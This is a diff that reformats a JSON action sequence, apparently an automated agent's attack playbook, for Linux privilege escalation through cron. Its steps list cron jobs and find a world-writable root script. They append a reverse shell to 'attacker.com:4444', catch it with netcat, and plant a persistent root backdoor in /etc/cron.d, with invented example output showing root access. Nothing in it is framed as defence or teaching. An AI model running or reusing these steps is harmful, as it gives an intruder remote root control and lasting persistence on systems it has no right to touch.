@@ -5,26 +5,91 @@
   "parameters": [],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat /etc/crontab && ls -la /etc/cron.* && crontab -l 2>/dev/null"]},
-      "expected_output": {"type": "string", "example": "/etc/crontab contents:\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n*/5 *   * * *   root    /usr/local/bin/cleanup.sh\n\n/etc/cron.d:\n-rw-r--r-- 1 root root 201 Jan 10 backup_job\n\n/etc/cron.daily:\n-rwxr-xr-x 1 root root 539 backup_script\n-rwxrwxrwx 1 root root 102 cleanup_logs\n\nWritable cron job found: /etc/cron.daily/cleanup_logs (world-writable!)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat /etc/crontab && ls -la /etc/cron.* && crontab -l 2>/dev/null"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "/etc/crontab contents:\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n*/5 *   * * *   root    /usr/local/bin/cleanup.sh\n\n/etc/cron.d:\n-rw-r--r-- 1 root root 201 Jan 10 backup_job\n\n/etc/cron.daily:\n-rwxr-xr-x 1 root root 539 backup_script\n-rwxrwxrwx 1 root root 102 cleanup_logs\n\nWritable cron job found: /etc/cron.daily/cleanup_logs (world-writable!)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "ls -la /usr/local/bin/cleanup.sh && cat /usr/local/bin/cleanup.sh"]},
-      "expected_output": {"type": "string", "example": "-rwxr-xrwx 1 root root 145 Jan 15 09:00 /usr/local/bin/cleanup.sh\n\n#!/bin/bash\nfind /tmp -type f -mtime +7 -delete\nfind /var/log -name '*.old' -delete\necho \"Cleanup completed at $(date)\" >> /var/log/cleanup.log\n\nVulnerability: cleanup.sh is world-writable and runs as root every 5 minutes"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "ls -la /usr/local/bin/cleanup.sh && cat /usr/local/bin/cleanup.sh"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "-rwxr-xrwx 1 root root 145 Jan 15 09:00 /usr/local/bin/cleanup.sh\n\n#!/bin/bash\nfind /tmp -type f -mtime +7 -delete\nfind /var/log -name '*.old' -delete\necho \"Cleanup completed at $(date)\" >> /var/log/cleanup.log\n\nVulnerability: cleanup.sh is world-writable and runs as root every 5 minutes"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /usr/local/bin/cleanup.sh"]},
-      "expected_output": {"type": "string", "example": "Injecting reverse shell into cleanup.sh\n\nModified /usr/local/bin/cleanup.sh:\n#!/bin/bash\nfind /tmp -type f -mtime +7 -delete\nfind /var/log -name '*.old' -delete\necho \"Cleanup completed at $(date)\" >> /var/log/cleanup.log\nbash -i >& /dev/tcp/attacker.com/4444 0>&1\n\nWaiting for cron execution (runs every 5 minutes)..."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /usr/local/bin/cleanup.sh"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Injecting reverse shell into cleanup.sh\n\nModified /usr/local/bin/cleanup.sh:\n#!/bin/bash\nfind /tmp -type f -mtime +7 -delete\nfind /var/log -name '*.old' -delete\necho \"Cleanup completed at $(date)\" >> /var/log/cleanup.log\nbash -i >& /dev/tcp/attacker.com/4444 0>&1\n\nWaiting for cron execution (runs every 5 minutes)..."
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "nc -lvnp 4444"]},
-      "expected_output": {"type": "string", "example": "Listening on 0.0.0.0 4444\nConnection received from victim.com 192.168.1.50:45678\n\nroot@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@victim:~# whoami\nroot\n\nroot@victim:~# pwd\n/root\n\nRoot reverse shell received from cron job exploitation"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "nc -lvnp 4444"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Listening on 0.0.0.0 4444\nConnection received from victim.com 192.168.1.50:45678\n\nroot@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@victim:~# whoami\nroot\n\nroot@victim:~# pwd\n/root\n\nRoot reverse shell received from cron job exploitation"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"' > /etc/cron.d/backdoor"]},
-      "expected_output": {"type": "string", "example": "Creating malicious cron job in /etc/cron.d/\n\nChecking if /etc/cron.d is writable...\nls -ld /etc/cron.d\ndrwxrwxrwx 2 root root 4096 Jan 15 10:50 /etc/cron.d\n\nDirectory is world-writable!\n\nCreated /etc/cron.d/backdoor:\n* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"\n\nPersistent root backdoor established - connects every minute"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"' > /etc/cron.d/backdoor"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Creating malicious cron job in /etc/cron.d/\n\nChecking if /etc/cron.d is writable...\nls -ld /etc/cron.d\ndrwxrwxrwx 2 root root 4096 Jan 15 10:50 /etc/cron.d\n\nDirectory is world-writable!\n\nCreated /etc/cron.d/backdoor:\n* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"\n\nPersistent root backdoor established - connects every minute"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
